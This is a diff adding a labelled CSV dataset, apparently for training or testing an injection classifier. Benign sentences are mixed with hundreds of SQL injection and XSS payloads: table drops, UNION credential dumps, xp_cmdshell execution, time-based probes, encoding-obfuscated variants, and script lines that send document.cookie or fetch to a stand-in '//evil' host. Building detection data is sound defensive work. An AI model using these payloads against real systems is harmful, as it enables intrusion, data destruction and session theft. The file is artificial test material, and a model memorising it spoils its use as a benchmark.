@@ -1,0 +1,397 @@
+text,label
+""") ; DROP TABLE users --",1
+The regex \bword\b matches the expected input format.,0
+1' OR 'a'='a' -- -,1
+The SELECT statement retrieves rows; use WHERE to filter and ORDER BY to sort.,0
+""") AND 1=CONVERT(int,@@version) --",1
+if (count >= 10 || retry) { throw new Error('x'); },0
+"git commit -m ""fix: resolve null pointer in auth module""",0
+Smith & Sons Law Firm LLC,0
+1'%09AND%09SLEEP(5)%09--,1
+Contact Müller at 49 3rd Ave re: the <draft> proposal.,0
+Open the file at C:\Users\Admin\setup.bat and edit line 42.,0
+<script>print()</script>,1
+Contact Kowalski at 86 King's Cross re: the <draft> proposal.,0
+Email a_b-c@company.org or ping @a_b-c on Slack.,0
+if (x != y && z > 0) { grantAccess(); },0
+Contact Müller at 61 O'Connell St re: the <draft> proposal.,0
+1'/**/;/**/DROP/**/TABLE/**/users/**/--,1
+if (flag & MASK) { throw new Error('x'); },0
+1'+;+DROP+TABLE+users+--,1
+<input onfocus=alert(document.domain) autofocus>,1
+<ScRiPt>location='//evil'</sCrIpT>,1
+Contact John at 5 O'Malley Ave re: the <draft> proposal.,0
+"<iframe src=""javascript:location='//evil'"">",1
+Email dev.ops@company.com or ping @dev.ops on Slack.,0
+<body onload=alert(1)>,1
+Contact Ng at 60 O'Connell St re: the <draft> proposal.,0
+<svg/onload=eval(atob('YWxlcnQoMSk='))>,1
+<ScRiPt>fetch('//evil')</sCrIpT>,1
+img src=x oNeRRor=/**/(alert)(1),1
+"admin')union select user,pass('",1
+Contact van der Berg at 28 St. John's Rd re: the <draft> proposal.,0
+<ScRiPt>confirm(document.cookie)</sCrIpT>,1
+Open the file at C:\Users\Admin\main.py and edit line 42.,0
+""") OR 1e0=1e0 --",1
+1'/**/AND/**/SLEEP(5)/**/--,1
+admin'); exec xp_cmdshell('dir')(',1
+<img src=x onerror=alert(1)>,1
+if (a['key'] == b['key']) { queue.push(item); },0
+"1'%09AND%091=CONVERT(int,@@version)%09--",1
+"<iframe src=""javascript:fetch('//evil')"">",1
+1`;DROP TABLE `users`;--,1
+"<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>",1
+<input onfocus=new Image().src='//x?'+document.cookie autofocus>,1
+Email a_b-c@company.co.uk or ping @a_b-c on Slack.,0
+1'%09OR%091e0=1e0%09--,1
+<ScRiPt>print()</sCrIpT>,1
+admin')or 'a'='a'(',1
+show me the users table where the password equals anything,1
+Contact O'Brien at 89 O'Connell St re: the <draft> proposal.,0
+"' AND 1=CONVERT(int,@@version) #",1
+Contact O'Brien at 46 St. John's Rd re: the <draft> proposal.,0
+'%0d%0aOR%0d%0a'a'='a,1
+Contact D'Angelo at 70 O'Malley Ave re: the <draft> proposal.,0
+<script>fetch('//evil')</script>,1
+Contact Kowalski at 84 3rd Ave re: the <draft> proposal.,0
+if (user.role == 'admin') { return true; },0
+<img src=x onerror=fetch('//evil')>,1
+Email team+alerts@company.org or ping @team+alerts on Slack.,0
+if (flag & MASK) { queue.push(item); },0
+Recipe: mix 2 cups flour w/ 1 tsp salt; bake @ 350F for 20 min.,0
+' ; EXEC xp_cmdshell('dir') #,1
+Contact Müller at 76 King's Cross re: the <draft> proposal.,0
+In the lecture we derived: A OR B = 1 when either is true.,0
+Meeting notes 10/25: discussed Q3 <-> Q4 transition plan.,0
+Contact Ng at 15 O'Malley Ave re: the <draft> proposal.,0
+"She said ""1=1 is always true"" during the boolean-logic lecture.",0
+Contact van der Berg at 10 3rd Ave re: the <draft> proposal.,0
+if (count >= 10 || retry) { queue.push(item); },0
+1'+AND+SLEEP(5)+--,1
+eval(atob('YWxlcnQoMSk=')),1
+<input onfocus=print() autofocus>,1
+Contact Müller at 10 O'Malley Ave re: the <draft> proposal.,0
+1'/**/OR/**/0x31=0x31/**/--,1
+1'%0aAND%0a1=1%0a#,1
+The onclick attribute runs a function when the element is clicked.,0
+Contact María at 45 3rd Ave re: the <draft> proposal.,0
+1'+OR+'a'='a'+--,1
+Contact Kowalski at 26 Rue de l'Église re: the <draft> proposal.,0
+Contact O'Malley at 83 Rue de l'Église re: the <draft> proposal.,0
+<svg/onload=location='//evil'>,1
+if (flag & MASK) { grantAccess(); },0
+Contact Müller at 85 Baker St re: the <draft> proposal.,0
+if (status == 200) { return true; },0
+Contact John at 75 St. John's Rd re: the <draft> proposal.,0
+Contact Smith at 6 King's Cross re: the <draft> proposal.,0
+1'/**/;/**/EXEC/**/xp_cmdshell('dir')/**/--,1
+Contact O'Malley at 35 O'Connell St re: the <draft> proposal.,0
+"<iframe src=""javascript:eval(atob('YWxlcnQoMSk='))"">",1
+Contact Kowalski at 35 O'Connell St re: the <draft> proposal.,0
+""") UNION SELECT NULL,NULL --",1
+admin')or ''=''(',1
+<script>eval(atob('YWxlcnQoMSk='))</script>,1
+1'/**/OR/**/2>1/**/--,1
+Contact Smith at 77 Baker St re: the <draft> proposal.,0
+1'%09;%09DROP%09TABLE%09users%09--,1
+1%0aAND%0a1=1%0a#,1
+The regex ^https?://.+$ matches the expected input format.,0
+<input onfocus=location='//evil' autofocus>,1
+１＇ ＯＲ ＇１＇＝＇１,1
+<body onload=print()>,1
+1'%09OR%092>1%09--,1
+Open the file at C:\Program Files\Tool\config.yml and edit line 42.,0
+' OR 0x31=0x31 #,1
+In the lecture we derived: 1 < n && n <= 100.,0
+Email j.smith@company.org or ping @j.smith on Slack.,0
+<body onload=eval(atob('YWxlcnQoMSk='))>,1
+"Address: 42 O'Malley Ave, Apt #7, (near the park)",0
+Email dev.ops@company.net or ping @dev.ops on Slack.,0
+"<iframe src=""javascript:alert(document.domain)"">",1
+OR%201%3D1,1
+cost = qty * unit_price; if (cost > budget) { flag(); },0
+admin')and sleep(5)(',1
+"1' UNION SELECT user,pass -- -",1
+Email a_b-c@company.net or ping @a_b-c on Slack.,0
+<svg/onload=confirm(document.cookie)>,1
+javascript:fetch('//evil'),1
+"admin')and 1=convert(int,@@version)('",1
+"My favorite quote: ""to be or not to be"" -- Shakespeare",0
+<img src=x onerror=location='//evil'>,1
+Contact van der Berg at 72 Rue de l'Église re: the <draft> proposal.,0
+Open the file at /var/log/nginx/setup.bat and edit line 42.,0
+javascript:alert(document.domain),1
+Contact MacLeod at 99 Baker St re: the <draft> proposal.,0
+Contact Müller at 22 Rue de l'Église re: the <draft> proposal.,0
+run javascript that reads the visitor's cookies and sends them away,1
+Open the file at D:\Projects\app\error.log and edit line 42.,0
+"123 O'Connell St, Dublin",0
+Error code: 500 (Internal Server Error) -- see logs for details.,0
+Contact O'Brien at 11 Baker St re: the <draft> proposal.,0
+<img src=x onerror=alert(document.domain)>,1
+Contact María at 83 Rue de l'Église re: the <draft> proposal.,0
+' OR 0x31=0x31--,1
+In the lecture we derived: SELECT-style set notation: {x | x > 0}.,0
+"1'+AND+1=CONVERT(int,@@version)+--",1
+1'+OR+1=1+--,1
+Email j.smith@company.net or ping @j.smith on Slack.,0
+Email dev.ops@company.io or ping @dev.ops on Slack.,0
+""") OR 'x'='x' --",1
+Contact van der Berg at 4 King's Cross re: the <draft> proposal.,0
+"The regex (foo|bar){1,3} matches the expected input format.",0
+Email team+alerts@company.io or ping @team+alerts on Slack.,0
+<body onload=alert(document.domain)>,1
+"' UNION SELECT user,pass #",1
+"/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--",1
+select all passwords from the accounts table,1
+Email j.smith@company.io or ping @j.smith on Slack.,0
+if (status == 200) { log.info('ok'); },0
+Contact Müller at 7 St. John's Rd re: the <draft> proposal.,0
+Contact D'Angelo at 65 O'Connell St re: the <draft> proposal.,0
+<svg/onload=print()>,1
+<input onfocus=confirm(document.cookie) autofocus>,1
+' ; DROP TABLE users #,1
+<ScRiPt>new Image().src='//x?'+document.cookie</sCrIpT>,1
+"<a href=""jav&#97;script:confirm(document.cookie)"">x</a>",1
+1)) OR (('1')=('1,1
+OR 0x31=0x31--,1
+Email dev.ops@company.org or ping @dev.ops on Slack.,0
+Contact O'Malley at 46 King's Cross re: the <draft> proposal.,0
+Open the file at C:\Program Files\Tool\main.py and edit line 42.,0
+admin')and (select count(*) from users)>0(',1
+union the results with the admin credentials table,1
+adminʼ OR ʼ1ʼ=ʼ1,1
+""") ; EXEC xp_cmdshell('dir') --",1
+<script>new Image().src='//x?'+document.cookie</script>,1
+Contact D'Angelo at 63 Baker St re: the <draft> proposal.,0
+"1'%09UNION%09SELECT%09user,pass%09--",1
+Contact O'Malley at 72 Baker St re: the <draft> proposal.,0
+if (status == 200) { throw new Error('x'); },0
+1'%09OR%09''=''%09--,1
+"'""<img src=x id=dmFyIGE9YWxlcnQoMSk=onerror=eval(atob(this.id))>",1
+<script>alert(document.domain)</script>,1
+<script>alert(1)</script>,1
+javascript:alert(1),1
+Escaping user input prevents script injection on the page.,0
+"' UNION SELECT NULL,NULL #",1
+"1'/**/UNION/**/SELECT/**/user,pass/**/--",1
+Contact María at 4 O'Connell St re: the <draft> proposal.,0
+if (x != y && z > 0) { queue.push(item); },0
+Email team+alerts@company.net or ping @team+alerts on Slack.,0
+1'+OR+1e0=1e0+--,1
+Open the file at C:\Program Files\Tool\data\out.csv and edit line 42.,0
+Contact María at 79 King's Cross re: the <draft> proposal.,0
+"<iframe src=""javascript:confirm(document.cookie)"">",1
+In the lecture we derived: dx/dt = 3x - 2.,0
+1' OR ''='' -- -,1
+"<iframe srcdoc=""&lt;script&gt;alert(1)&lt;/script&gt;""></iframe>",1
+"<iframe src=""javascript:new Image().src='//x?'+document.cookie"">",1
+1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/users)>0/**/--,1
+if (count >= 10 || retry) { return true; },0
+"<a href=""jav&#97;script:new Image().src='//x?'+document.cookie"">x</a>",1
+Open the file at ~/scripts/error.log and edit line 42.,0
+Contact van der Berg at 19 O'Malley Ave re: the <draft> proposal.,0
+1'/**/OR/**/1e0=1e0/**/--,1
+1' AND SLEEP(5) -- -,1
+javascript:eval(atob('YWxlcnQoMSk=')),1
+1'%09OR%091=1%09--%09-,1
+＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（１）＜／ｓｃｒｉｐｔ＞,1
+Open the file at D:\Projects\app\setup.bat and edit line 42.,0
+Contact O'Malley at 39 St. John's Rd re: the <draft> proposal.,0
+Contact María at 80 St. John's Rd re: the <draft> proposal.,0
+x contenteditable onfocus=alert(1) autofocus,1
+Open the file at C:\Users\Admin\config.yml and edit line 42.,0
+Product SKU# ABC-123; Category: Electronics & Gadgets (in stock).,0
+"1 UNION SELECT 0x61646d696e,0x70617373776f7264--",1
+"The DROP command deletes a table, so use it carefully in migrations.",0
+insert a script tag that pops an alert box saying one,1
+make the query always true so it returns everything,1
+Email team+alerts@company.com or ping @team+alerts on Slack.,0
+Contact John at 86 King's Cross re: the <draft> proposal.,0
+Contact Chen at 1 Rue de l'Église re: the <draft> proposal.,0
+Open the file at /var/log/nginx/data\out.csv and edit line 42.,0
+<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>,1
+"admin')union select null,null('",1
+if (user.role == 'admin') { log.info('ok'); },0
+Contact us at support@company.com or call (555) 123-4567.,0
+Contact Ng at 12 3rd Ave re: the <draft> proposal.,0
+if (a['key'] == b['key']) { log.info('ok'); },0
+""") OR 1=1 --",1
+"'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--",1
+Open the file at C:\Program Files\Tool\error.log and edit line 42.,0
+bypass the login by making the where clause always match,1
+<svg><animate onbegin=alert(1) attributeName=x>,1
+1'%09OR%09'a'='a'%09--,1
+Open the file at D:\Projects\app\main.py and edit line 42.,0
+if (x != y && z > 0) { throw new Error('x'); },0
+"""<img src=x id=dmFyIGE9YWxlcnQoMSk=onerror=eval(atob(this.id))>",1
+Contact Smith at 87 3rd Ave re: the <draft> proposal.,0
+1%09OR%091=1%09--%09-,1
+Open the file at /var/log/nginx/error.log and edit line 42.,0
+1′ OR 1=1,1
+Wrap the content in <table> and <tr> tags to build the layout.,0
+Email j.smith@company.com or ping @j.smith on Slack.,0
+Contact O'Brien at 99 Rue de l'Église re: the <draft> proposal.,0
+Contact Ng at 20 Baker St re: the <draft> proposal.,0
+"Rated 4.5/5 stars -- ""great product, fast shipping!""",0
+Contact Chen at 91 King's Cross re: the <draft> proposal.,0
+admin')or 2>1(',1
+if (x != y && z > 0) { return true; },0
+Contact D'Angelo at 60 King's Cross re: the <draft> proposal.,0
+Contact John at 57 O'Connell St re: the <draft> proposal.,0
+1' OR 1=1 -- -,1
+Open the file at C:\Program Files\Tool\setup.bat and edit line 42.,0
+' AND SLEEP(5) #,1
+Contact D'Angelo at 86 St. John's Rd re: the <draft> proposal.,0
+Open the file at C:\Users\Admin\error.log and edit line 42.,0
+admin')or 0x31=0x31(',1
+<svg/onload=alert(1)>,1
+Email a_b-c@company.com or ping @a_b-c on Slack.,0
+Email j.smith@company.co.uk or ping @j.smith on Slack.,0
+jav&#97;script:alert(1),1
+javascript:print(),1
+if (user.role == 'admin') { queue.push(item); },0
+Open the file at ~/scripts/setup.bat and edit line 42.,0
+<script>confirm(document.cookie)</script>,1
+` OR `1`=`1,1
+1'+OR+0x31=0x31+--,1
+""") UNION SELECT user,pass --",1
+Use parameterised queries instead of string concatenation for safety.,0
+Contact Chen at 10 3rd Ave re: the <draft> proposal.,0
+Email team+alerts@company.co.uk or ping @team+alerts on Slack.,0
+Contact Chen at 66 Baker St re: the <draft> proposal.,0
+In the lecture we derived: P(A|B) = P(B|A)*P(A)/P(B).,0
+Contact Smith at 66 St. John's Rd re: the <draft> proposal.,0
+Open the file at /var/log/nginx/main.py and edit line 42.,0
+return every row where the login always succeeds,1
+Contact Smith at 12 Rue de l'Église re: the <draft> proposal.,0
+An <iframe> embeds another document inside the current page.,0
+""") AND SLEEP(5) --",1
+'+UN'+'ION+SEL'+'ECT+1--,1
+' OR 1e0=1e0 #,1
+if (a['key'] == b['key']) { throw new Error('x'); },0
+"1'%09UNION%09SELECT%09NULL,NULL%09--",1
+Contact Ng at 92 St. John's Rd re: the <draft> proposal.,0
+Contact O'Malley at 62 O'Malley Ave re: the <draft> proposal.,0
+' AND (SELECT COUNT(*) FROM users)>0 #,1
+<img src=x onerror=new Image().src='//x?'+document.cookie>,1
+"The regex [A-Z]{2,4}-\d+ matches the expected input format.",0
+admin')or 1=1(',1
+<img src=x onerror=print()>,1
+Contact D'Angelo at 9 Rue de l'Église re: the <draft> proposal.,0
+<body onload=fetch('//evil')>,1
+Contact Smith at 75 O'Malley Ave re: the <draft> proposal.,0
+""") OR ''='' --",1
+<svg/onload=new Image().src='//x?'+document.cookie>,1
+Product SKU# ABC-123; Category: Electronics & Gadgets,0
+' OR 'a'='a' #,1
+<svg/onload=fetch('//evil')>,1
+Contact Smith at 9 O'Connell St re: the <draft> proposal.,0
+Contact John at 1 3rd Ave re: the <draft> proposal.,0
+"1' UNION SELECT NULL,NULL -- -",1
+"<a href=""jav&#97;script:alert(1)"">x</a>",1
+"1' AND 1=CONVERT(int,@@version) -- -",1
+Discount code SAVE20% applies to orders over $50.,0
+1;SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END--,1
+Contact MacLeod at 40 King's Cross re: the <draft> proposal.,0
+add an image that runs code when it fails to load,1
+<input onfocus=fetch('//evil') autofocus>,1
+<ScRiPt>eval(atob('YWxlcnQoMSk='))</sCrIpT>,1
+<input onfocus=alert(1) autofocus>,1
+if (a['key'] == b['key']) { return true; },0
+Contact MacLeod at 86 O'Malley Ave re: the <draft> proposal.,0
+Contact O'Brien at 13 3rd Ave re: the <draft> proposal.,0
+' OR 1=1 #,1
+"Please review section 3.2(a) of the contract, re: pricing.",0
+if (count >= 10 || retry) { log.info('ok'); },0
+<script>location='//evil'</script>,1
+' OR 'x'='x' #,1
+"<a href=""jav&#97;script:print()"">x</a>",1
+admin')or 1e0=1e0(',1
+if (status == 200) { grantAccess(); },0
+"<a href=""jav&#97;script:location='//evil'"">x</a>",1
+if (flag & MASK) { return true; },0
+Email a_b-c@company.io or ping @a_b-c on Slack.,0
+The regex ^[a-z]+@[a-z]+\.(com|org)$ matches the expected input format.,0
+<body onload=location='//evil'>,1
+Contact Ng at 24 Rue de l'Église re: the <draft> proposal.,0
+Contact MacLeod at 19 St. John's Rd re: the <draft> proposal.,0
+Contact O'Brien at 31 O'Malley Ave re: the <draft> proposal.,0
+Contact John at 15 Baker St re: the <draft> proposal.,0
+The regex \d{3}-\d{4} matches the expected input format.,0
+"<a href=""jav&#97;script:alert(document.domain)"">x</a>",1
+1'+OR+''=''+--,1
+Contact Chen at 43 St. John's Rd re: the <draft> proposal.,0
+"<iframe src=""javascript:alert(1)"">",1
+1'+;+EXEC+xp_cmdshell('dir')+--,1
+Open the file at ~/scripts/main.py and edit line 42.,0
+1' ; DROP TABLE users -- -,1
+＇ ＯＲ １＝１ －－,1
+Contact O'Malley at 9 3rd Ave re: the <draft> proposal.,0
+1'/**/OR/**/1=1/**/--,1
+"1'+UNION+SELECT+NULL,NULL+--",1
+Contact MacLeod at 15 3rd Ave re: the <draft> proposal.,0
+if (status == 200) { queue.push(item); },0
+1' OR 1e0=1e0 -- -,1
+' OR ''='' #,1
+Contact O'Brien at 3 King's Cross re: the <draft> proposal.,0
+<template><script>alert(1)</script></template>,1
+Contact María at 62 O'Malley Ave re: the <draft> proposal.,0
+Open the file at ~/scripts/data\out.csv and edit line 42.,0
+""") OR 2>1 --",1
+<img src=x onerror=confirm(document.cookie)>,1
+1' ; EXEC xp_cmdshell('dir') -- -,1
+Contact Ng at 2 King's Cross re: the <draft> proposal.,0
+<img src=x oNeRRor=/**/(alert)(1)>,1
+admin')or 'x'='x'(',1
+In the lecture we derived: f(x) = x^2 + 1 for x != 0.,0
+"<a href=""jav&#97;script:fetch('//evil')"">x</a>",1
+Contact D'Angelo at 32 3rd Ave re: the <draft> proposal.,0
+1%253bDROP%20TABLE%20`users`%253b--,1
+<script>/*comment*/alert`1`</script>,1
+"1'/**/UNION/**/SELECT/**/NULL,NULL/**/--",1
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;,1
+1'%09OR%091=1%09--,1
+javascript:location='//evil',1
+Contact MacLeod at 68 Rue de l'Église re: the <draft> proposal.,0
+Open the file at D:\Projects\app\config.yml and edit line 42.,0
+Contact Kowalski at 68 O'Malley Ave re: the <draft> proposal.,0
+1'/**/OR/**/'a'='a'/**/--,1
+Contact Kowalski at 59 St. John's Rd re: the <draft> proposal.,0
+Open the file at D:\Projects\app\data\out.csv and edit line 42.,0
+%0d%0aOR%0d%0a'a'='a,1
+1'%09OR%090x31=0x31%09--,1
+if (user.role == 'admin') { throw new Error('x'); },0
+Contact Chen at 19 O'Malley Ave re: the <draft> proposal.,0
+<svg/onload=alert(document.domain)>,1
+"Rated 4.5/5 -- ""great value & fast shipping!"" per the review.",0
+Contact Chen at 3 O'Connell St re: the <draft> proposal.,0
+"<a href=""jav&#97;script:eval(atob('YWxlcnQoMSk='))"">x</a>",1
+"/*/**/String.fromCharCode(97,108,101,114,116,40,49,41)",1
+1'%09;%09EXEC%09xp_cmdshell('dir')%09--,1
+1' OR 2>1 -- -,1
+admin'); drop table users(',1
+Open the file at C:\Users\Admin\data\out.csv and edit line 42.,0
+Contact van der Berg at 64 O'Connell St re: the <draft> proposal.,0
+"git commit -m ""fix: null check in auth('user') path""",0
+1'+AND+(SELECT+COUNT(*)+FROM+users)>0+--,1
+Contact van der Berg at 21 Baker St re: the <draft> proposal.,0
+"1'+UNION+SELECT+user,pass+--",1
+if (a['key'] == b['key']) { grantAccess(); },0
+A UNION combines two result sets that share the same columns.,0
+SELECT is a reserved keyword in most SQL dialects.,0
+1' OR 'x'='x' -- -,1
+if (count >= 10 || retry) { grantAccess(); },0
+<body onload=new Image().src='//x?'+document.cookie>,1
+Open the file at /var/log/nginx/config.yml and edit line 42.,0
+Contact María at 3 Baker St re: the <draft> proposal.,0
+if (user.role == 'admin') { grantAccess(); },0
+Open the file at ~/scripts/config.yml and edit line 42.,0
+<ScRiPt>alert(document.domain)</sCrIpT>,1
+if (x != y && z > 0) { log.info('ok'); },0
+Email dev.ops@company.co.uk or ping @dev.ops on Slack.,0
+Contact John at 12 Rue de l'Église re: the <draft> proposal.,0
+Contact Kowalski at 32 Baker St re: the <draft> proposal.,0
+drop the users table from the database,1
+Contact MacLeod at 45 O'Connell St re: the <draft> proposal.,0
+if (flag & MASK) { log.info('ok'); },0
